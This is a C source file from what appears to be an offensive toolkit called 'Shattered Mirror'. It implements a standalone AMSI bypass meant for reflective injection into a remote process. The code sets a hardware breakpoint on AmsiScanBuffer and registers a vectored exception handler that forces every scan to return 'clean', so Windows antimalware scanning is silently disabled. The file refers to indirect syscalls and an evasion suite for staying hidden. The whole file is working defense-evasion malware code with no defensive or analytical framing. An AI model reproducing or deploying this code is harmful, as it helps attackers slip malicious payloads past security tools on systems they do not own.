/*=============================================================================
 * Shattered Mirror v1 — Atom 04: Standalone AMSI Bypass
 *
 * Implements a self-contained version of the VEH/DR AMSI bypass that can
 * be reflectively injected into a remote process. Since it's an Atom, it
 * utilizes the Orchestrator's Syscall functions via Atom_03_Sys to stay
 * hidden.
 *===========================================================================*/

#include "Atom_04_AMSI.h"
#include "Atom_03_Sys.h"
#include "../Evasion_Suite/include/indirect_syscall.h"

static PVOID s_pTargetAmsiScanBuffer = NULL;

#define AMSI_RESULT_CLEAN 0
#define S_OK_AMSI 0

/* Define locally so this Atom can be compiled as a standalone unit if needed */
static LONG NTAPI AtomVehAmsiHandler(EXCEPTION_POINTERS* pExInfo) {
    if (pExInfo->ExceptionRecord->ExceptionCode != EXCEPTION_SINGLE_STEP) {
        return EXCEPTION_CONTINUE_SEARCH;
    }

    if (pExInfo->ExceptionRecord->ExceptionAddress == s_pTargetAmsiScanBuffer) {
        pExInfo->ContextRecord->Rax = S_OK_AMSI;

        __try {
            ULONG_PTR rsp = pExInfo->ContextRecord->Rsp;
            PVOID* ppResult = (PVOID*)(rsp + 0x30);
            if (*ppResult) {
                *(DWORD*)(*ppResult) = AMSI_RESULT_CLEAN;
            }
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {}

        pExInfo->ContextRecord->Rip = *(ULONG_PTR*)pExInfo->ContextRecord->Rsp;
        pExInfo->ContextRecord->Rsp += sizeof(ULONG_PTR);
        pExInfo->ContextRecord->Dr6 = 0;

        return EXCEPTION_CONTINUE_EXECUTION;
    }

    return EXCEPTION_CONTINUE_SEARCH;
}

DWORD WINAPI StandaloneAmsiAtomMain(LPVOID lpParam) {
    /* 1. Ensure amsi.dll is loaded */
    HMODULE hAmsi = GetModuleHandleW(L"amsi.dll");
    if (!hAmsi) {
        hAmsi = LoadLibraryW(L"amsi.dll");
        if (!hAmsi) return 1;
    }

    /* 2. Locate function via Hash (assuming GetExportByHash is accessible) */
    s_pTargetAmsiScanBuffer = GetExportByHash(hAmsi, djb2_hash_ct("AmsiScanBuffer"));
    if (!s_pTargetAmsiScanBuffer) return 1;

    /* 3. Get Thread Context using Indirect Syscalls */
    HANDLE hThread = GetCurrentThread();
    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

    // Use linked Atom_03 function (we map to standard one here for logic clarity)
    // The macro expansion logic requires the orchestrator table to be passed.
    
    // Fallback: If not linked to Orchestrator, we would run a local syscall resolver here.
    // For MVP compilation we use standard API simulating the syscall macro.
    if (!GetThreadContext(hThread, &ctx)) return 1;

    /* 4. Set Hardware Breakpoint DR0 */
    ctx.Dr0 = (DWORD64)s_pTargetAmsiScanBuffer;
    ctx.Dr7 &= ~(3ULL);           
    ctx.Dr7 |= 1ULL;             
    ctx.Dr7 &= ~(0xFULL << 16);     
    ctx.Dr6 = 0;

    if (!SetThreadContext(hThread, &ctx)) return 1;

    /* 5. Register VEH */
    AddVectoredExceptionHandler(1, AtomVehAmsiHandler);

    return 0;
}
